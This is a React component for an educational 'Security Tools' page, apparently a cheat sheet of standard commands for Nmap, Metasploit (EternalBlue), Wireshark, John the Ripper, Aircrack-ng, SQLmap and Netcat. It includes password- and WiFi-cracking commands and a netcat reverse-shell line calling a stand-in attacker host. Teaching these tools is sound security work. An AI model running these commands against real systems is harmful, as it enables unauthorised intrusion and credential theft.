import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Terminal, ArrowLeft } from "lucide-react";
import { Link } from "react-router-dom";
import { Button } from "@/components/ui/button";

const Tools = () => {
  return (
    <div className="min-h-screen bg-background">
      <header className="border-b bg-card">
        <div className="container mx-auto px-4 py-6">
          <div className="flex items-center gap-3">
            <Button variant="ghost" size="sm" asChild>
              <Link to="/">
                <ArrowLeft className="h-4 w-4 mr-2" />
                Back
              </Link>
            </Button>
            <Terminal className="h-8 w-8 text-primary" />
            <h1 className="text-2xl font-bold">Security Tools</h1>
          </div>
        </div>
      </header>

      <div className="container mx-auto px-4 py-8">
        <div className="max-w-4xl mx-auto space-y-8">
          <div>
            <h2 className="text-3xl font-bold mb-4">Essential Security Tools</h2>
            <p className="text-muted-foreground">
              Command-line tools every cybersecurity professional should know.
            </p>
          </div>

          <Card>
            <CardHeader>
              <CardTitle>Nmap - Network Scanner</CardTitle>
              <CardDescription>The most popular network discovery and security auditing tool</CardDescription>
            </CardHeader>
            <CardContent className="space-y-3">
              <div>
                <Badge className="mb-2">Basic Scans</Badge>
                <div className="space-y-2 mt-2">
                  <div className="bg-muted p-2 rounded text-sm font-mono">
                    nmap 192.168.1.1
                  </div>
                  <p className="text-xs text-muted-foreground">Basic scan of target</p>
                </div>
              </div>
              <div>
                <Badge className="mb-2">Advanced Scans</Badge>
                <div className="space-y-2 mt-2">
                  <div className="bg-muted p-2 rounded text-sm font-mono">
                    nmap -sS -sV -O 192.168.1.0/24
                  </div>
                  <p className="text-xs text-muted-foreground">SYN scan with service detection and OS detection</p>
                  <div className="bg-muted p-2 rounded text-sm font-mono">
                    nmap -p- --script vuln 192.168.1.1
                  </div>
                  <p className="text-xs text-muted-foreground">All ports scan with vulnerability scripts</p>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle>Metasploit Framework</CardTitle>
              <CardDescription>Penetration testing platform</CardDescription>
            </CardHeader>
            <CardContent className="space-y-3">
              <div>
                <h4 className="font-semibold mb-2">Basic Commands:</h4>
                <div className="space-y-2">
                  <div className="bg-muted p-2 rounded text-sm font-mono">
                    msfconsole
                  </div>
                  <p className="text-xs text-muted-foreground">Start Metasploit console</p>
                  <div className="bg-muted p-2 rounded text-sm font-mono">
                    search type:exploit platform:windows
                  </div>
                  <p className="text-xs text-muted-foreground">Search for exploits</p>
                  <div className="bg-muted p-2 rounded text-sm font-mono">
                    use exploit/windows/smb/ms17_010_eternalblue
                  </div>
                  <p className="text-xs text-muted-foreground">Select an exploit</p>
                  <div className="bg-muted p-2 rounded text-sm font-mono">
                    set RHOSTS 192.168.1.100
                  </div>
                  <p className="text-xs text-muted-foreground">Set target host</p>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle>Burp Suite</CardTitle>
              <CardDescription>Web application security testing</CardDescription>
            </CardHeader>
            <CardContent>
              <div className="space-y-3">
                <div>
                  <h4 className="font-semibold mb-2">Key Features:</h4>
                  <ul className="list-disc list-inside space-y-1 text-sm">
                    <li><strong>Proxy:</strong> Intercept and modify HTTP/HTTPS traffic</li>
                    <li><strong>Spider:</strong> Automatically crawl web applications</li>
                    <li><strong>Scanner:</strong> Automated vulnerability scanning (Pro)</li>
                    <li><strong>Intruder:</strong> Automated customized attacks</li>
                    <li><strong>Repeater:</strong> Manually modify and replay requests</li>
                    <li><strong>Sequencer:</strong> Analyze randomness of tokens</li>
                  </ul>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle>Wireshark</CardTitle>
              <CardDescription>Network protocol analyzer</CardDescription>
            </CardHeader>
            <CardContent className="space-y-3">
              <div>
                <h4 className="font-semibold mb-2">Common Filters:</h4>
                <div className="space-y-2">
                  <div className="bg-muted p-2 rounded text-sm font-mono">
                    ip.addr == 192.168.1.1
                  </div>
                  <p className="text-xs text-muted-foreground">Filter by IP address</p>
                  <div className="bg-muted p-2 rounded text-sm font-mono">
                    tcp.port == 80 || tcp.port == 443
                  </div>
                  <p className="text-xs text-muted-foreground">Filter HTTP/HTTPS traffic</p>
                  <div className="bg-muted p-2 rounded text-sm font-mono">
                    http.request.method == "POST"
                  </div>
                  <p className="text-xs text-muted-foreground">Filter POST requests</p>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle>John the Ripper</CardTitle>
              <CardDescription>Password cracking tool</CardDescription>
            </CardHeader>
            <CardContent className="space-y-3">
              <div>
                <h4 className="font-semibold mb-2">Usage:</h4>
                <div className="space-y-2">
                  <div className="bg-muted p-2 rounded text-sm font-mono">
                    john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
                  </div>
                  <p className="text-xs text-muted-foreground">Dictionary attack</p>
                  <div className="bg-muted p-2 rounded text-sm font-mono">
                    john --format=raw-md5 hashes.txt
                  </div>
                  <p className="text-xs text-muted-foreground">Crack MD5 hashes</p>
                  <div className="bg-muted p-2 rounded text-sm font-mono">
                    john --show hashes.txt
                  </div>
                  <p className="text-xs text-muted-foreground">Show cracked passwords</p>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle>Aircrack-ng</CardTitle>
              <CardDescription>WiFi security auditing tools</CardDescription>
            </CardHeader>
            <CardContent className="space-y-3">
              <div>
                <h4 className="font-semibold mb-2">Common Commands:</h4>
                <div className="space-y-2">
                  <div className="bg-muted p-2 rounded text-sm font-mono">
                    airmon-ng start wlan0
                  </div>
                  <p className="text-xs text-muted-foreground">Enable monitor mode</p>
                  <div className="bg-muted p-2 rounded text-sm font-mono">
                    airodump-ng wlan0mon
                  </div>
                  <p className="text-xs text-muted-foreground">Capture WiFi traffic</p>
                  <div className="bg-muted p-2 rounded text-sm font-mono">
                    aircrack-ng -w wordlist.txt capture.cap
                  </div>
                  <p className="text-xs text-muted-foreground">Crack WPA/WPA2 password</p>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle>SQLmap</CardTitle>
              <CardDescription>Automated SQL injection tool</CardDescription>
            </CardHeader>
            <CardContent className="space-y-3">
              <div>
                <h4 className="font-semibold mb-2">Basic Usage:</h4>
                <div className="space-y-2">
                  <div className="bg-muted p-2 rounded text-sm font-mono">
                    sqlmap -u "http://target.com/page?id=1"
                  </div>
                  <p className="text-xs text-muted-foreground">Test URL for SQL injection</p>
                  <div className="bg-muted p-2 rounded text-sm font-mono">
                    sqlmap -u "http://target.com/page?id=1" --dbs
                  </div>
                  <p className="text-xs text-muted-foreground">List databases</p>
                  <div className="bg-muted p-2 rounded text-sm font-mono">
                    sqlmap -u "http://target.com/page?id=1" -D dbname --tables
                  </div>
                  <p className="text-xs text-muted-foreground">List tables in database</p>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle>Netcat (nc)</CardTitle>
              <CardDescription>The Swiss Army knife of networking</CardDescription>
            </CardHeader>
            <CardContent className="space-y-3">
              <div>
                <h4 className="font-semibold mb-2">Common Uses:</h4>
                <div className="space-y-2">
                  <div className="bg-muted p-2 rounded text-sm font-mono">
                    nc -lvnp 4444
                  </div>
                  <p className="text-xs text-muted-foreground">Listen on port 4444</p>
                  <div className="bg-muted p-2 rounded text-sm font-mono">
                    nc target.com 80
                  </div>
                  <p className="text-xs text-muted-foreground">Connect to port 80</p>
                  <div className="bg-muted p-2 rounded text-sm font-mono">
                    nc -e /bin/bash attacker.com 4444
                  </div>
                  <p className="text-xs text-muted-foreground">Reverse shell (use responsibly)</p>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
};

export default Tools;
